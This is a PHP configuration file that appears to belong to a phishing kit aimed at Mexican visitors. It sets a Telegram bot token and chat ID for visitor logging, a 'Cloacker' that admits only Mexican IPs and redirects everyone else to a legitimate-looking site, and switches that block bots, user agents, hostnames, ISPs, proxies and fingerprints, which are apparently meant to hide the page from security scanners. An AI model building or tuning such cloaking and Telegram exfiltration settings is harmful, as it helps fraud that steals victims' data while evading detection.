<?php

return [
    'config' => [

        // Telegram true | false
        'id' => env('TELEGRAM_CHAT_ID', ''),
        'key' => env('TELEGRAM_BOT_TOKEN', ''),
        'tg' => env('TELEGRAM_VISITOR_LOGGING', false),

        // Cloacker true | false
        'comprobate_country' => false, // Deshabilitado temporalmente por problemas con ip-api.com
        'countries_allowed' => ['MX'],
        'url' => 'https://app.coba.ai/',

        // Antiflood true | false
        'blocker' => false,

        // Antibots true | false
        'GUARD' => false,

        // Guardian (config avanzada) true | false
        'anti_bots' => true,
        'anti_ua' => true,
        'anti_hn' => true,
        'anti_isp' => true,
        'anti_fingerprints' => false,
        'anti_proxy' => true,

        // Mobile Detect true | false
        'mobile_detect' => false
    ],
];
